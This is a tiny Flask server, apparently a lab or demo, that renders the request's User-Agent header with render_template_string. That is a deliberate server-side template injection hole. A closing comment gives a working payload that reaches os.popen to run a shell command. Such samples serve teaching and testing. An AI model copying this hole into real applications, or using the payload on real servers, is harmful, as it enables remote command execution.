from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():    
    try:
        text = request.headers.get("User-Agent")
    except:
        text = None  
    return render_template_string(text)

if __name__ == "__main__":
    app.run()

#{{self.__init__.__globals__.__builtins__.__import__('os').popen('ps').read()}}